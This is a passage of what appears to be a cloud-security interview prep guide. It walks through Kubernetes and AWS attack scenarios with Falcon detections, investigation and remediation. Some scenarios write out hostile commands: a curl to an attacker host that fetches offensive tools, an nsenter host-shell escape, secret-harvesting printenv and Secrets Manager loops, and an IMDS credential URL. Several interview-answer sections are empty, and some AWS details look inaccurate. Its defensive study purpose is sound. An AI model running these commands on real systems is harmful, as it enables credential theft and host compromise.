4. Was this expected? Contact the user/team — was there a planned debugging session?

**Risk:** High — attacker has live interactive access to a production workload.

**Remediation:** Terminate the `exec` session, rotate the compromised `kubeconfig`, restrict `pods/exec` RBAC to break-glass roles only, use K8s audit logging to alert on all `exec` events, consider using ephemeral debug containers instead.

**Interview Answer:**
> "Interactive intrusion is particularly dangerous because it mimics legitimate admin behavior. I detect it by alerting on all `pods/exec` calls via K8s audit logs and correlating with Falcon's interactive session detection. My policy: `pods/exec` is restricted to an emergency break-glass role, requires MFA, and triggers an automatic PagerDuty alert."

---

### Scenario 6: eBPF Program Loaded from Container

**What Happened:** An advanced attacker loaded a malicious eBPF program from inside a container to intercept network traffic or tamper with security monitoring.

**Detection Signals:**
- **Falcon IOA:** `PotentialKernelTampering` — eBPF invoked from within a container
- **Detection Description:** "The eBPF feature has been invoked from within a container. This is a highly unusual activity and can be used to load a kernel rootkit or manipulate kernel behavior affecting the entire host."

**Investigation:**
1. Which container triggered this? Check the detection's container context (ID, image, namespace)
2. What eBPF program was loaded? Check the process tree for `bpf()` syscall details
3. Was the container privileged? eBPF requires `CAP_SYS_ADMIN` or `CAP_BPF`
4. Is this a legitimate monitoring tool (e.g., Cilium, Falco) or unexpected?

**Risk:** Critical — eBPF can intercept syscalls, modify kernel behavior, and hide attacker activity from security tools.

**Remediation:** Kill the pod immediately, investigate the node for rootkits, drop `CAP_SYS_ADMIN` and `CAP_BPF` capabilities via KAC policy.

**Interview Answer:**
> "eBPF from inside a container is a critical-severity finding. Legitimate eBPF usage happens at the node level (Cilium, Falcon sensor itself), never from application containers. This indicates either a kernel rootkit attempt or a container breakout in progress. I immediately kill the container and investigate the node."

---

### Scenario 7: Lateral Movement — Pod to Internal Service

**What Happened:** A compromised pod scanned the internal K8s network and connected to a database service that it shouldn't have access to.

**Detection Signals:**
- **Falcon:** Port scanning activity from the pod (rapid connection attempts to many IPs/ports)
- **Falcon IOA:** `SuspiciousNetworkConnection` — connection to internal service not in pod's normal baseline
- **Network Policy Violation (if policies exist):** Blocked connections logged
- **K8s Audit Log:** Pod queried the K8s DNS for `service-name.namespace.svc.cluster.local`

**Investigation:**
1. What services were targeted? Check network connections from the pod
2. How did the attacker get the service addresses? K8s DNS resolves all services — no discovery needed
3. Was the connection successful? If no NetworkPolicies, the answer is likely yes
4. What data was accessed?

**Risk:** High — K8s flat networking means every pod can reach every service by default.

**Remediation:** Implement **default-deny NetworkPolicies** in every namespace, only allow specific pod-to-service communication, restrict K8s DNS access per namespace.

**Interview Answer:**
> "Lateral movement in K8s is trivial by default because the network is flat — every pod can talk to every service. This is why default-deny NetworkPolicies are my #1 K8s security recommendation. Falcon detects the scanning activity and anomalous connections, but the real fix is network segmentation."

---

### Scenario 8: Unidentified Container — Not Visible to K8s

**What Happened:** A container was launched directly via `docker run` on the worker node, bypassing the K8s orchestrator entirely.

**Detection Signals:**
- **Falcon:** Unidentified container — `Visible to K8s: No`
- **Falcon:** Container not associated with any pod, deployment, or namespace
- **Falcon:** Container image not in any approved registry

**Investigation:**
1. How was a container launched outside K8s? This indicates **the worker node itself is compromised**
2. What image is running? Is it from an approved registry?
3. Who has SSH/console access to the worker node?
4. Check the node for other indicators of compromise

**Risk:** Critical — node-level compromise. The K8s orchestrator has no visibility or control.

**Remediation:** Kill the container via `sudo docker kill <id>` using Falcon RTR, investigate the node for full compromise, rebuild the node from a golden AMI, disable SSH access to worker nodes.

**Interview Answer:**
> "An unidentified container not visible to K8s is a critical finding — it means either the worker node is compromised or someone accessed the node directly. I immediately kill the container via Falcon RTR, cordon the node, and trigger a full node investigation. Worker nodes should never have direct SSH access in production."

---

### Scenario 9: Rogue Container from Unauthorized Image Registry

**What Happened:** A pod was deployed using an image from Docker Hub instead of the organization's private ECR registry.

**Detection Signals:**
- **KAC IOM:** Image not from approved registry
- **Image Assessment:** Unassessed image — not in any approved scanning pipeline
- **Runtime Detection:** Container running with unknown image provenance

**Investigation:**
1. Who deployed this? Check K8s audit logs for the deployment creator
2. What image is it? Is it a known base image or something suspicious?
3. Was it deployed intentionally (developer shortcut) or maliciously (supply chain attack)?

**Risk:** High — unscanned images may contain vulnerabilities, malware, or backdoors.

**Remediation:** Set KAC to **Prevent** for unassessed images, restrict image pull policies to private registry only (`imagePullPolicy: Always` + registry restrictions via OPA), scan all images in CI/CD pipeline.

**Interview Answer:**
> "This is a supply chain security gap. I enforce registry restrictions at two levels: KAC blocks pods with unassessed images, and OPA/Gatekeeper policies ensure images can only be pulled from our private ECR registry. Any image from Docker Hub in production is either a developer shortcut or an attack."

---

### Scenario 10: Privilege Escalation via SUID Binary

**What Happened:** An attacker found a binary with the SetUID bit set inside a container and used it to escalate to root.

**Detection Signals:**
- **Image Detection:** `SetUIDBitFoundInImage` (pre-runtime)
- **Runtime IOA:** Process execution with escalated privileges
- **Process Tree:** Unprivileged user → SUID binary execution → root shell

**Investigation:**
1. Which binary has the SUID bit? Common targets: `find`, `nmap`, `vim`, `python`
2. Was this binary in the original image or downloaded (drift)?
3. What did the attacker do after escalation?

**Risk:** High — root access inside the container increases breakout risk.

**Remediation:** Remove unnecessary SUID bits from images (`RUN chmod u-s /usr/bin/...`), set `allowPrivilegeEscalation: false` in securityContext, use `no-new-privileges` security option.

**Interview Answer:**
> "SUID binaries are a classic Linux privilege escalation vector. In containers, I prevent this at three levels: image scanning flags SUID bits in CI/CD, `allowPrivilegeEscalation: false` blocks the kernel mechanism, and KAC enforces this policy at admission time."

---

### Scenario 11: Suspicious Outbound DNS — C2 Communication

**What Happened:** A compromised container is using DNS tunneling to exfiltrate data to a C2 server.

**Detection Signals:**
- **Falcon:** Unusual DNS query patterns — high volume of queries to a single unusual domain
- **Falcon IOA:** `SuspiciousDNSRequest` — query to known-bad domain
- **Network:** DNS queries with abnormally long subdomain labels (data encoded in DNS)

**Investigation:**
1. What domain is being queried? Check against threat intelligence
2. What is the query pattern? Legitimate DNS is infrequent; tunneling generates hundreds of queries per minute
3. What process is generating the DNS queries? Check process tree
4. Is the container acting as a DNS client to an external resolver or using cluster DNS?

**Risk:** High — data exfiltration via DNS bypasses most network controls.

**Remediation:** Restrict pod DNS to cluster DNS only (no direct external DNS), implement DNS monitoring/filtering, NetworkPolicies blocking UDP/53 to external IPs.

**Interview Answer:**
> "DNS tunneling is a sophisticated exfiltration technique because most firewalls allow DNS. Falcon detects it through anomalous DNS query patterns and known-bad domain matching. My prevention: pods should only use cluster DNS, external DNS resolution should go through a filtered resolver, and NetworkPolicies should block direct UDP/53 egress."

---

### Scenario 12: AWS Credentials Stolen from IMDS via Pod

**What Happened:** A pod on an EKS worker node queried the Instance Metadata Service (IMDS) at `169.254.169.254` and stole the node's IAM role credentials.

**Detection Signals:**
- **Falcon:** HTTP request to `169.254.169.254` from application process
- **GuardDuty:** `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
- **CloudTrail:** API calls from the node's instance role with source IP outside VPC CIDR

**Investigation:**
1. Which pod made the IMDS request? Check Falcon's container context
2. Was the pod supposed to have AWS access? If yes, it should use IRSA, not IMDS
3. Were the credentials used externally? Check CloudTrail for the role ARN

**Risk:** Critical — node-level IAM credentials are usually more permissive than pod-level IRSA roles.

**Remediation:** Enforce **IMDSv2** (`http-put-response-hop-limit: 1` prevents containers from reaching IMDS), deploy **IRSA** for pod-level IAM access, block `169.254.169.254` in pod NetworkPolicies.

**Interview Answer:**
> "This is why IRSA exists. If a pod needs AWS access, it should use IRSA with a scoped IAM role, not the node's instance profile. I enforce IMDSv2 with a hop-limit of 1, which prevents containers from reaching IMDS. Additionally, I add a NetworkPolicy explicitly blocking `169.254.169.254`."

---

### Scenario 13: ConfigMap/Secret Enumeration via K8s API

**What Happened:** A compromised pod used its auto-mounted service account token to list all secrets across all namespaces.

**Detection Signals:**
- **K8s Audit Log:** `get`/`list` on `secrets` resource across multiple namespaces from an unexpected service account
- **Falcon Runtime:** `curl` or `kubectl` spawned inside a container (drift)
- **Falcon IOA:** Reconnaissance activity — systematic API enumeration

**Investigation:**
1. What service account was used? Check the K8s audit log `userIdentity`
2. Does this SA have `list secrets` permission? (It shouldn't!)
3. What secrets were accessed? Check the response from the API
4. Were any secrets used subsequently (connection to a database, API call)?

**Risk:** Critical — K8s secrets contain database passwords, API keys, certificates.

**Remediation:** Set `automountServiceAccountToken: false` for all pods that don't need API access, apply least-privilege RBAC (no `get secrets` for application SAs), encrypt etcd at rest.

**Interview Answer:**
> "Service account token abuse is a major K8s attack vector. The default behavior of auto-mounting the SA token into every pod gives attackers a free API key. I set `automountServiceAccountToken: false` by default and only enable it for pods that genuinely need API access, with tightly scoped RBAC."

---

### Scenario 14: Container Escape via Docker Socket Mount

**What Happened:** A Pod was configured to mount the container runtime socket (`/var/run/docker.sock`). An attacker used it to create a new container with full host access.

**Detection Signals:**
- **KAC IOM:** HostPath volume mount of `/var/run/docker.sock` or `/var/run/containerd/containerd.sock`
- **Falcon Runtime:** New container creation detected outside K8s orchestrator
- **Falcon:** Unidentified container appeared (not managed by K8s)
- **Drift:** `docker` CLI or `ctr` executed inside the pod

**Investigation:**
1. Why was the runtime socket mounted? Common for CI/CD pods (Docker-in-Docker) or monitoring tools
2. What commands were executed against the socket?
3. Were new containers created? With what privileges?
4. Was the host filesystem mounted in the new container?

**Risk:** Critical — access to the runtime socket = ability to create privileged containers = full host compromise.

**Remediation:** Block `/var/run/docker.sock` and `/var/run/containerd/` mounts via KAC (HostPath Volume rule → Prevent), use alternatives for CI/CD (Kaniko for builds, no socket mounting), enforce this in OPA policies.

**Interview Answer:**
> "The container runtime socket is the keys to the kingdom. Anyone who can create containers on the node can create a privileged one and own the host. I absolutely block socket mounts via KAC policy. For CI/CD use cases like Docker-in-Docker, I use Kaniko which builds images without requiring a Docker daemon."

---

### Scenario 15: Falcon Sensor Coverage Gap — DaemonSet Not Running

**What Happened:** A new EKS node group was added to the cluster, but the Falcon sensor DaemonSet was not scheduled on the new nodes due to a taint/toleration mismatch.

**Detection Signals:**
- **Coverage Dashboard:** Container coverage dropped from 100% to 85%
- **AWS API vs Falcon API Reconciliation:** 3 EC2 instances have no corresponding Falcon sensor
- **DaemonSet Status:** `kubectl get ds -n falcon-system` shows `DESIRED: 10, CURRENT: 7`

**Investigation:**
1. Why aren't the sensors scheduled? Check for **taints** on the new nodes and **tolerations** in the DaemonSet spec
2. Are there node selectors or affinity rules that exclude the new nodes?
3. Is there a resource constraint preventing the sensor pod from scheduling?

**Risk:** High — unmonitored nodes are blind spots. Any attack on these nodes will not generate Falcon alerts.

**Remediation:** Add the appropriate tolerations to the Falcon DaemonSet, set up automated coverage reconciliation (Lambda comparing EC2 API ↔ Falcon API daily), alert on coverage drops.

**Interview Answer:**
> "Coverage gaps are a governance risk. An attacker will target the node without sensors. I reconcile coverage daily by comparing the AWS EC2 API (list of all EKS nodes) against the Falcon Hosts API (list of reporting sensors). Any mismatch triggers a PagerDuty alert. The most common cause is taint/toleration mismatch when new node groups are added — I ensure the Falcon DaemonSet tolerates all common EKS taints."

---

> [!TIP]
> **Interview Day Tip:** When answering runtime detection scenarios, always follow this structure:
> 1. **"First, I look at..."** — identify the detection signal
> 2. **"Then I check..."** — describe the investigation
> 3. **"My immediate action is..."** — containment
> 4. **"To prevent this in the future..."** — remediation and prevention
> 
> This shows methodical thinking and operational maturity.

---

# PART V: ADVANCED ATTACK SCENARIOS (15 Full Kill-Chain)

> Each scenario follows: Initial Foothold → Escalation → Lateral Movement → Detection Telemetry → False Positive Logic → Root Cause Analysis → Containment → Governance → Interview Pitch.

---

# PART 2: 15 ADVANCED ATTACK SCENARIOS

Each scenario follows a structured format: Initial Foothold → Escalation → Lateral Movement → Detection Telemetry → False Positive Logic → Root Cause Analysis → Containment → Governance → Interview Pitch.

SCENARIO 1
## 1. EC2 Metadata Service (IMDS v1) Exploitation via SSRF

Domain: EC2 Compromise
### 1. Initial Attacker Foothold

Attacker discovers a Server-Side Request Forgery (SSRF) vulnerability in a web application running on EC2. The app blindly fetches URLs provided by user input.

### 2. Escalation Path

Using SSRF to query http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>, the attacker retrieves temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken). These credentials are then used to enumerate S3 buckets, EC2 instances, and IAM roles.

### 3. Lateral Movement Technique

With retrieved credentials, the attacker calls sts:AssumeRole on other roles visible via iam:ListRoles. If the compromised role has iam:PassRole, they create a Lambda function with an admin-level role attached.

### 4. Detection Telemetry

Falcon CWPP: Anomalous HTTP request chain — app process making outbound connection to 169.254.169.254. CloudTrail: GetSecurityToken from unusual user-agent (python-requests vs expected SDK). GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS if credentials are used from external IP.

### 5. False Positive Differentiation Logic

Legitimate health checks hit the metadata endpoint, but they query specific paths like /latest/meta-data/instance-id. Distinguish by path: /iam/security-credentials/ is never accessed by legitimate apps. Also check user-agent and source process.

### 6. Root Cause Analysis Steps

1) Confirm SSRF endpoint in app logs. 2) Trace all CloudTrail events using the stolen session token. 3) Check GetCallerIdentity events to see where credentials were used. 4) Review the app codebase for the URL-fetch function. 5) Verify if IMDSv2 (token-based) was enforced.

### 7. Containment Workflow

1) Immediately invalidate the EC2 instance profile session via IAM deny policy. 2) Patch or WAF-block the SSRF endpoint. 3) Enforce IMDSv2 (aws ec2 modify-instance-metadata-options --http-tokens required). 4) Rotate all credentials the role could access. 5) Apply CSPM finding to enforce IMDSv2 org-wide via SCP.

### 8. Governance Implications

CIS AWS Benchmark 1.1: Enable IMDSv2 on all EC2 instances. Add CSPM policy to flag any instance with IMDSv1 enabled. Mandate WAF rules for SSRF patterns on all public-facing workloads.

### 9. How to Explain in Interview

SCENARIO 2
## 2. IAM Privilege Escalation via iam:CreatePolicyVersion

Domain: IAM Privilege Escalation
### 1. Initial Attacker Foothold

Attacker compromises an EC2 developer instance with an overly-permissive instance profile that includes iam:CreatePolicyVersion and iam:SetDefaultPolicyVersion.

### 2. Escalation Path

Attacker creates a new version of an existing managed policy, injecting AdministratorAccess into its JSON document, then sets it as the default version. Any principal using that policy now has admin privileges.

### 3. Lateral Movement Technique

With effective admin access, attacker creates a new IAM user with console access, attaches AdministratorAccess, creates long-lived access keys for persistence, then begins enumerating all S3 buckets across the org.

### 4. Detection Telemetry

CloudTrail: iam:CreatePolicyVersion with policy document containing "*:*". iam:SetDefaultPolicyVersion event immediately after. Falcon CIEM: PolicyVersionCreated alert with detected privilege expansion from restricted to admin scope. GuardDuty: Policy:IAMUser/RootCredentialUsage if they escalate to root equivalence.

### 5. False Positive Differentiation Logic

Legitimate DevOps engineers update policy versions during deployments. Key differentiators: (1) Is the new version adding broader permissions than existing? (2) Is the principal a human user vs automated pipeline? (3) Is the action happening outside business hours? (4) Did the same session also run ListRoles or ListBuckets immediately after?

### 6. Root Cause Analysis Steps

1) Pull all CloudTrail events for the compromised access key in a 7-day window. 2) Identify which IAM policy was modified and what permissions were added. 3) List all principals attached to that policy — determine blast radius. 4) Check for any new users/keys created during the incident window. 5) Review the EC2 instance profile — why did a dev instance have iam:CreatePolicyVersion?

### 7. Containment Workflow

1) Revert the policy version to the last known-good version. 2) Deny all sessions originating from the compromised key (IAM inline deny with date condition). 3) Delete any rogue IAM users or access keys created. 4) Remove iam:CreatePolicyVersion from the developer instance profile. 5) Add CSPM rule: alert on any policy version that expands permissions beyond baseline.

### 8. Governance Implications

NIST PR.AC-4: Implement least privilege. Remove iam:CreatePolicyVersion from all non-pipeline principals. All IAM policy changes must go through IaC pipeline with peer review. CIEM should run weekly blast-radius analysis on all instance profiles.

### 9. How to Explain in Interview

SCENARIO 3
## 3. Cross-Account Role Chaining via Misconfigured Trust Policies

Domain: Cross-Account Role Abuse
### 1. Initial Attacker Foothold

Attacker gains initial access via stolen access keys from a developer laptop (exfiltrated from a .env file committed to a public GitHub repo, detected retroactively).

### 2. Escalation Path

The compromised principal belongs to Account A and has sts:AssumeRole. The attacker discovers that a role in Account B (data-analytics-role) has a trust policy allowing any principal from Account A without an External-ID or condition. They assume it and gain access to sensitive data lakes.

### 3. Lateral Movement Technique

From Account B, the attacker discovers a third role in Account C (billing-admin-role) that trusts Account B. Chaining three hops, they reach billing data and attempt to create new resources to establish persistence.

### 4. Detection Telemetry

CloudTrail across all 3 accounts: AssumeRole events with matching session tokens creating a chain. Source IPs do not match any known corporate egress. Falcon CIEM: CrossAccountRoleChain alert showing the 3-hop path with effective permissions computed at each node. GuardDuty: UnauthorizedAccess:IAMUser/TorIPCaller if exiting via anonymizing infrastructure.

### 5. False Positive Differentiation Logic

Cross-account role assumptions are normal in multi-account architectures. False positives arise from legitimate CI/CD pipelines that assume roles across accounts. Key signal is the source IP — pipeline IPs are fixed and known. An assumption from a residential/VPN/Tor IP at an unusual hour with an aws-cli user-agent is highly suspicious. Correlate the chain depth — 3-hop assumptions are almost never legitimate.

### 6. Root Cause Analysis Steps

1) Trace all three AssumeRole events across accounts using linked CloudTrail organization trail. 2) Map the full identity chain from stolen key to final session. 3) Pull all API calls made under each assumed session. 4) Identify which trust policies lacked conditions. 5) Check if External-ID or aws:SourceVpc conditions exist.

### 7. Containment Workflow

1) Revoke all active sessions in all three accounts using IAM deny with DateLessThan condition. 2) Add aws:SourceAccount or aws:PrincipalAccount conditions to all cross-account trust policies. 3) Add SCP to deny sts:AssumeRole from external principals without approved source conditions. 4) Rotate the original compromised access key immediately. 5) Enable AWS Config rule: cross-account trust without condition.

### 8. Governance Implications

Every cross-account trust policy must require aws:SourceAccount, aws:SourceVpc, or ExternalId condition — enforced by a preventive CSPM policy that blocks non-compliant trust policies. Cross-account assumptions must be logged in a central CloudTrail org trail that security owns.

### 9. How to Explain in Interview

SCENARIO 4
## 4. S3 Data Exfiltration via Presigned URL Abuse

Domain: S3 Data Exfiltration
### 1. Initial Attacker Foothold

Attacker compromises a Lambda function that has S3:GetObject permissions, via exposed environment variables in application logs that included the function's execution role credentials.

### 2. Escalation Path

Rather than directly downloading data (which would generate high-volume CloudTrail noise), the attacker generates pre-signed URLs for sensitive objects using s3:GeneratePresignedUrl. These URLs are valid for 7 days and can be fetched from any IP without appearing as API calls from the compromised role.

### 3. Lateral Movement Technique

Pre-signed URL downloads do not appear in CloudTrail as the original role's API calls — they appear as anonymous GET requests in S3 server access logs, often ignored by teams. Attacker also uses aws s3 sync to a bucket in an attacker-controlled AWS account.

### 4. Detection Telemetry

CloudTrail: s3:GeneratePresignedUrl calls for PII objects. S3 Server Access Logs: Large volume of GetObject requests from external IPs. Falcon CSPM: S3LargeVolumeExternalTransfer alert on the sync operation. Macie: Sensitive data access pattern for PII bucket — mass read of objects outside normal access pattern.

### 5. False Positive Differentiation Logic

Applications legitimately generate pre-signed URLs for user file downloads. Differentiate by: (1) Volume — how many objects are being signed in a single session? (2) Object classification — are these classified as PII or sensitive by Macie? (3) Is the Lambda environment expected to do bulk signing? (4) Destination IP for the sync — is it an AWS account in the org?

### 6. Root Cause Analysis Steps

1) Query S3 server access logs for the bucket with high GetObject volume from external IPs. 2) Correlate with CloudTrail GeneratePresignedUrl events from the same time window. 3) Identify which Lambda execution triggered the signing. 4) Review Lambda environment variables in CloudTrail for any PutFunctionConfiguration events. 5) Estimate total data accessed (object sizes × count).

### 7. Containment Workflow

1) Revoke Lambda execution role immediately. 2) Invalidate all pre-signed URLs (change bucket policy to deny requests older than current time). 3) Enable S3 Object Lock on PII buckets. 4) Remove environment variable credentials from Lambda (use IRSA or SSM Parameter Store). 5) Enable S3 server access logging on all buckets with Macie classification.

### 8. Governance Implications

All S3 buckets with Macie-classified sensitive data must have: (1) Object-level logging enabled, (2) S3 Block Public Access active, (3) Pre-signed URL expiry limited to 1 hour via bucket policy, (4) VPC endpoint restriction so S3 is only accessible from within VPC. This is enforced as a CSPM Critical finding.

### 9. How to Explain in Interview

SCENARIO 5
## 5. EKS RBAC Misconfiguration — ClusterRoleBinding to system:masters

Domain: EKS RBAC Misconfiguration
### 1. Initial Attacker Foothold

An IAM role used by a CI/CD pipeline is mapped in the aws-auth ConfigMap to the system:masters Kubernetes group — effectively giving any bearer of that role cluster-admin rights.

### 2. Escalation Path

Attacker compromises the CI/CD pipeline's IAM credentials. They use kubectl with those credentials, discover the system:masters mapping, and use it to list all secrets across all namespaces: kubectl get secrets -A.

### 3. Lateral Movement Technique

From secrets enumeration, attacker finds database credentials, third-party API keys, and other service account tokens. They create a new admin ClusterRoleBinding for a service account they control, establishing persistence that survives IAM credential rotation.

### 4. Detection Telemetry

Kubernetes Audit Logs: list secrets verb from a service account or IAM principal not expected to have that access. Falcon CWPP: KubernetesAudit.SecretEnumeration alert. CloudTrail: sts:AssumeRole for the CI/CD role from an unusual source IP/user-agent. Falcon KAC: If attacker tries to create privileged pods from their persistent access, KAC blocks and alerts.

### 5. False Positive Differentiation Logic

CI/CD pipelines legitimately use IAM roles to deploy to EKS. The differentiator is the RBAC group mapping — a CI/CD role should be mapped to a deploy-only ClusterRole with specific deploy permissions, never system:masters. Also check: is the request coming from the expected pipeline IP range or a known runner?

### 6. Root Cause Analysis Steps

1) Audit aws-auth ConfigMap: kubectl get configmap aws-auth -n kube-system -o yaml. 2) List all ClusterRoleBindings to identify any unexpected system:masters or cluster-admin bindings. 3) Pull Kubernetes audit logs for secrets list/get operations in the past 30 days. 4) Identify all service accounts created in the incident window. 5) Trace IAM events for the CI/CD role from CloudTrail.

### 7. Containment Workflow

1) Remove system:masters mapping from aws-auth — replace with a custom ClusterRole with minimal deploy permissions. 2) Rotate all secrets that were enumerated. 3) Delete any rogue ClusterRoleBindings or ServiceAccounts created by attacker. 4) Apply RBAC audit policy to log all secret access going forward. 5) Implement KAC policy to block any pod creation by service accounts with unexpected cluster-admin access.

### 8. Governance Implications

No IAM role should ever be mapped to system:masters in any cluster. This is a preventive CSPM policy (Critical). CI/CD pipelines should use a custom ClusterRole with only the specific resources needed (deployments, configmaps in specific namespaces). Regular RBAC audits should run weekly via automated scan of all ClusterRoleBindings.

### 9. How to Explain in Interview

SCENARIO 6
## 6. Container Escape via Privileged Container + hostPID Mount

Domain: Container Escape
### 1. Initial Attacker Foothold

A monitoring sidecar was deployed with privileged: true and hostPID: true in the deployment manifest, a misconfiguration that had passed through review because the original legitimate monitoring tool required it. Attacker compromises the main application container via a known CVE.

### 2. Escalation Path

From the compromised app container, the attacker pivots to the privileged sidecar using shared pod networking. With hostPID access, they can see all host processes: nsenter --target 1 --mount --pid --net --uts -- /bin/bash — giving them a root shell on the node.

### 3. Lateral Movement Technique

From the node, the attacker accesses the kubelet credentials, the node's instance profile (IMDS), and can read all other pods' secrets from /var/lib/kubelet/pods/. They enumerate all running pods and target the etcd pod for cluster-wide secret extraction.

### 4. Detection Telemetry

Falcon CWPP: ContainerEscape.NsenterToHostNamespace — detected nsenter with all namespace flags. PotentialPrivilegeEscalation alert for root UID operations from container process. InteractiveContainerSession alert for shell spawned in the context of the privileged container. KAC: (After the fact) — should have blocked privileged:true at admission.

### 5. False Positive Differentiation Logic

Some legitimate tools (node-level monitoring, storage drivers) need privileged access and hostPID. Distinguish by: (1) Was this deployment reviewed and approved? (2) Is nsenter being called interactively (attacker) vs as part of a scripted non-interactive workflow (legitimate)? (3) Is the process tree anomalous — attacker will spawn bash, cat, wget after nsenter.

### 6. Root Cause Analysis Steps

1) Reconstruct the container escape path via Falcon process tree. 2) Identify the CVE exploited in the app container. 3) Review deployment YAML for privileged/hostPID/hostNetwork flags. 4) Check if KAC was in Detect or Prevent mode for privileged container policy. 5) Audit all currently running privileged containers: kubectl get pods -A -o json | jq .items[].spec.containers[].securityContext.

### 7. Containment Workflow

1) Kill the compromised pod immediately. 2) Cordon and drain the node — assume full node compromise. 3) Replace node with fresh AMI. 4) Remove privileged:true and hostPID:true from all deployments that don't require it. 5) Set KAC policy to PREVENT mode for privileged containers with no approved exception annotation. 6) Rotate all secrets on affected node.

### 8. Governance Implications

Pod Security Standards: Enforce Restricted profile cluster-wide. Exception process required for any container needing Privileged or Baseline exemptions, approved by security team. KAC admission policy to block privileged:true, hostPID:true, hostNetwork:true unless pod has a signed exception annotation. Review and audit all existing exceptions quarterly.

### 9. How to Explain in Interview

SCENARIO 7
## 7. Container Drift — Post-Start Offensive Tool Injection

Domain: Drift Detection Events
### 1. Initial Attacker Foothold

Attacker exploits a remote code execution vulnerability in a Node.js API container via a deserialization flaw in a POST request body.

### 2. Escalation Path

Using the RCE, attacker executes: curl -sk https://attacker.io/kit.tgz | tar xz -C /tmp/. This drops: (1) pspy64 — process spy without root, (2) chisel — tunneling tool, (3) linpeas.sh — privilege escalation enumeration. All dropped after container start — not in original image layers.

### 3. Lateral Movement Technique

Using pspy64, attacker monitors cron jobs and environment variables of other processes. Using chisel they establish a reverse tunnel through port 443 to avoid network policy. linpeas.sh identifies SUID binaries and world-writable cron directories on the host (if container is privileged).

### 4. Detection Telemetry

Falcon CWPP: ContainerDrift.OffensiveToolDrop — SHA256 of pspy64 and chisel match known offensive tool hashes in threat intel. New executable written to /tmp post-start triggers drift event. BeaconLikeTraffic.PeriodicC2 from chisel's tunnel keepalive pattern. DNSTunneling alert if attacker pivots to DNS.

### 5. False Positive Differentiation Logic

Debug containers legitimately have tools installed, but this should be controlled. Differentiate by: (1) Are the dropped files on the known offensive tool hash list? (2) Was the file written by a curl/wget process vs a package manager? (3) Does the network traffic match C2 beacon patterns (periodic intervals)? (4) Is the container labeled as a debug container?

### 6. Root Cause Analysis Steps

1) Capture the drift event timestamps — first write event tells you when RCE occurred. 2) Reconstruct the exploit request from application logs around that timestamp. 3) Extract the dropped binary hashes from Falcon telemetry — submit to threat intel. 4) Trace all network connections made by the container after the drift event. 5) Identify the CVE in the Node.js application.

### 7. Containment Workflow

1) Enable Container Drift in PREVENT mode — kills any new executable written post-start. 2) Quarantine the pod (apply blocking NetworkPolicy via Falcon Fusion). 3) Preserve the container filesystem for forensics before deletion. 4) Patch the Node.js deserialization vulnerability immediately. 5) Redeploy from clean image.

### 8. Governance Implications

Container drift prevention should be in PREVENT mode for all production workloads. Debug containers must be explicitly labeled and time-limited (auto-deleted after 2 hours). Image scanning must check for deserialization vulnerabilities in language-specific dependency chains. readOnlyRootFilesystem: true should be enforced via KAC to block tool drops at the filesystem level.

### 9. How to Explain in Interview

SCENARIO 8
## 8. Malicious kubectl exec Abuse for Lateral Movement

Domain: Malicious kubectl exec Abuse
### 1. Initial Attacker Foothold

Attacker obtains a Kubernetes service account token from a leaked kubeconfig file in a public GitHub repository. The service account has exec permissions on pods in the payments namespace.

### 2. Escalation Path

Using kubectl exec, attacker enters the running payments-api pod. From inside, they read environment variables: printenv | grep -i "password|secret|key|token". They find database credentials and a third-party payment processor API key stored as env vars.

### 3. Lateral Movement Technique

With the database credentials, attacker connects to the RDS instance via the pod's network access. They exfiltrate 500,000 customer payment records using SELECT INTO OUTFILE to a controlled endpoint. The database connection is legitimate from the pod's IP — no anomaly at the network layer.

### 4. Detection Telemetry

Kubernetes Audit Log: exec operation from unexpected source IP/user-agent (personal laptop vs expected CI runner). Falcon CWPP: InteractiveContainerSession alert — TTY allocated in production pod. Shell command pattern after exec: env, printenv, cat /etc/*, mysql commands. CloudTrail: No direct event — K8s exec doesn't generate CloudTrail.

### 5. False Positive Differentiation Logic

kubectl exec is used legitimately by developers for debugging. Differentiate by: (1) Is the exec coming from a known developer IP or an unknown external IP? (2) Is the service account expected to have exec permissions in production? (3) What commands are run post-exec — env/printenv are high-signal when accessing a production pod. (4) Is the exec happening during business hours?

### 6. Root Cause Analysis Steps

1) Pull Kubernetes API server audit logs for the exec event — includes source IP, user-agent, and which pod. 2) Identify the service account used — trace back to the leaked kubeconfig. 3) Review all commands run in the exec session via Falcon CWPP interactive session recording. 4) Query database audit logs for the connection from the pod IP. 5) Estimate data exfiltrated from DB query logs.

### 7. Containment Workflow

1) Delete and rotate the compromised service account token immediately. 2) Remove exec permissions from the service account in RBAC. 3) Rotate all credentials found in the pod environment variables. 4) Revoke the database credentials and re-issue. 5) Add RBAC audit: no service account in production namespaces should have pods/exec permission.

### 8. Governance Implications

Production pods should never have exec permissions granted to service accounts. Secrets must not be stored as environment variables — use AWS Secrets Manager via CSI driver or IRSA. All kubectl exec events in production namespaces must generate a PagerDuty alert. Kubeconfig files must be git-ignored and secret-scanning enabled on all repos.

### 9. How to Explain in Interview

SCENARIO 9
## 9. AWS Secrets Manager Theft via Over-Privileged Lambda

Domain: Secrets Manager Theft
### 1. Initial Attacker Foothold

An attacker exploits a command injection vulnerability in a Lambda function exposed via API Gateway. The Lambda has secretsmanager:GetSecretValue on "*" — all secrets in the account.

### 2. Escalation Path

Using the command injection, attacker runs: aws secretsmanager list-secrets; then for each secret: aws secretsmanager get-secret-value --secret-id <name>. Within 60 seconds, they have extracted 47 secrets including: RDS master passwords, third-party API keys, Slack webhooks, payment processor tokens.

### 3. Lateral Movement Technique

Using the extracted RDS master credentials, attacker accesses production databases directly via the Lambda's VPC network access. Using Slack webhooks, they could potentially use them for data exfiltration as an out-of-band channel (HTTPS traffic to Slack is typically allowed).

### 4. Detection Telemetry

CloudTrail: ListSecrets followed by 47 GetSecretValue calls in 60 seconds — highly anomalous. Falcon CWPP: SuspiciousAWSAPICall.Lambda — process making secretsmanager API calls from within injected command context. Falcon CIEM: UnusedPrivilegeExercised — secretsmanager:GetSecretValue on "*" had never been exercised before. GuardDuty: SecretsManager:Lambda/MaliciousIPCaller if external IP triggers the injection.

### 5. False Positive Differentiation Logic

